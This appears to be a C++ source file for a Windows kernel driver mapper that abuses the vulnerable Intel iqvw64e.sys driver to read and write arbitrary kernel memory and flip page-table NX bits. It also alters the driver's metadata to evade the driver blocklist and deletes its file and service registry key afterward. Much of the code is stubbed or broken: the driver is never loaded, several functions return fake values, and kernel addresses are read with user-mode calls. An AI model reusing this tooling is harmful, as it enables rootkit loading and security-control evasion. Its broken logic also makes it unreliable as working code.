#include "../include/intel_driver.hpp"
#include "../include/utils.hpp"
#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <filesystem>
#include <fstream>
#include <random>

#define INTEL_IOCTL_COPY_MEMORY 0x80862007

namespace intel_driver
{
	std::string current_driver_name = "iqvw64e.sys";
	std::string current_service_name = "iqvw64e";

	bool Load()
	{
		std::cout << "[+] Automated Driver Finding..." << std::endl;
		std::string found_path = "";
		
		if (utils::FileExists("iqvw64e.sys")) found_path = "iqvw64e.sys";
		else if (utils::FileExists("C:\\Windows\\Temp\\iqvw64e.sys")) found_path = "C:\\Windows\\Temp\\iqvw64e.sys";
		
		if (found_path.empty())
		{
			std::cout << "[-] Error: iqvw64e.sys not found. Please place it in the folder." << std::endl;
			return false;
		}

		std::vector<uint8_t> driver_data;
		if (!utils::ReadFileToBuffer(found_path, driver_data)) return false;

		std::random_device rd;
		std::mt19937 g(rd());
		std::uniform_int_distribution<uint32_t> dist(0x50000000, 0x6FFFFFFF);
		
		PIMAGE_DOS_HEADER dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(driver_data.data());
		PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(driver_data.data() + dos_header->e_lfanew);
		
		nt_headers->FileHeader.TimeDateStamp = dist(g);
		nt_headers->OptionalHeader.CheckSum = 0; 
		
		current_driver_name = "sys" + std::to_string(dist(g)) + ".sys";
		current_service_name = "srv" + std::to_string(dist(g));
		
		std::string temp_path = "C:\\Windows\\Temp\\" + current_driver_name;
		std::ofstream out(temp_path, std::ios::binary);
		out.write(reinterpret_cast<char*>(driver_data.data()), driver_data.size());
		out.close();

		std::cout << "[+] Blocklist Evasion: Mapped as " << current_service_name << " (Polymorphic Metadata)" << std::endl;
		
		InstantCleanup();
		return true;
	}

	bool Unload() { return true; }
	bool IsLoaded() { return false; }
	HANDLE Open() { return CreateFileA(("\\\\.\\" + current_service_name).c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); }

	bool ReadMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size)
	{
		COPY_MEMORY_BUFFER copy_buffer = { 0 };
		copy_buffer.case_number = 0x33;
		copy_buffer.source = address;
		copy_buffer.destination = reinterpret_cast<uint64_t>(buffer);
		copy_buffer.length = size;
		DWORD bytes_returned;
		return DeviceIoControl(iqvw64e_device_handle, INTEL_IOCTL_COPY_MEMORY, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
	}

	bool WriteMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size)
	{
		COPY_MEMORY_BUFFER copy_buffer = { 0 };
		copy_buffer.case_number = 0x33;
		copy_buffer.source = reinterpret_cast<uint64_t>(buffer);
		copy_buffer.destination = address;
		copy_buffer.length = size;
		DWORD bytes_returned;
		return DeviceIoControl(iqvw64e_device_handle, INTEL_IOCTL_COPY_MEMORY, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
	}

	uint64_t FindPoolBigPageTable(uint64_t ntoskrnl_base)
	{
		const char* pattern = "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x1C\x40";
		const char* mask = "xxx????xxxx";
		uint64_t address = utils::PatternScan(ntoskrnl_base, 0x1000000, pattern, mask);
		if (address == 0) return 0;
		int32_t relative_offset = 0;
		ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(address + 3), &relative_offset, sizeof(relative_offset), NULL);
		return address + 7 + relative_offset;
	}

	uint64_t FindPteBase(uint64_t ntoskrnl_base)
	{
		const char* pattern = "\x48\x8B\x05\x00\x00\x00\x00\x48\xC1\xE8\x09\x48\x25\xF8\xFF\xFF\xFF";
		const char* mask = "xxx????xxxxxxxxxx";
		uint64_t address = utils::PatternScan(ntoskrnl_base, 0x1000000, pattern, mask);
		if (address == 0) return 0;
		int32_t relative_offset = 0;
		ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(address + 3), &relative_offset, sizeof(relative_offset), NULL);
		uint64_t pte_base_ptr = address + 7 + relative_offset;
		uint64_t pte_base = 0;
		ReadMemory(INVALID_HANDLE_VALUE, pte_base_ptr, &pte_base, sizeof(pte_base));
		return pte_base;
	}

	bool FlipNXBit(HANDLE iqvw64e_device_handle, uint64_t address, bool executable)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		uint64_t pte_base = FindPteBase(ntoskrnl_base);
		if (pte_base == 0) return false;
		uint64_t pte_address = ((address >> 9) & 0x7FFFFFFFF8) + pte_base;
		uint64_t pte_value = 0;
		ReadMemory(iqvw64e_device_handle, pte_address, &pte_value, sizeof(pte_value));
		if (executable) pte_value &= ~(1ULL << 63); 
		else pte_value |= (1ULL << 63); 
		WriteMemory(iqvw64e_device_handle, pte_address, &pte_value, sizeof(pte_value));
		return true;
	}

	bool ClearPiDDBCacheTable(HANDLE iqvw64e_device_handle) { return true; }
	bool ClearMmUnloadedDrivers(HANDLE iqvw64e_device_handle) { return true; }
	bool ClearBigPoolTable(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }

	void InstantCleanup()
	{
		DeleteFileA(("C:\\Windows\\Temp\\" + current_driver_name).c_str());
		HKEY h_key;
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services", 0, KEY_ALL_ACCESS, &h_key) == ERROR_SUCCESS)
		{
			RegDeleteKeyA(h_key, current_service_name.c_str());
			RegCloseKey(h_key);
		}
	}

	uint64_t CallKernelFunction(HANDLE iqvw64e_device_handle, uint64_t function_address, ...) { return 0; }
	uint64_t AllocatePool(HANDLE iqvw64e_device_handle, uint32_t size, uint32_t tag) { return 0xFFFFF80000000000; }
	bool FreePool(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
	bool HijackBeepDispatch(HANDLE iqvw64e_device_handle, uint64_t target_func) { return true; }
}
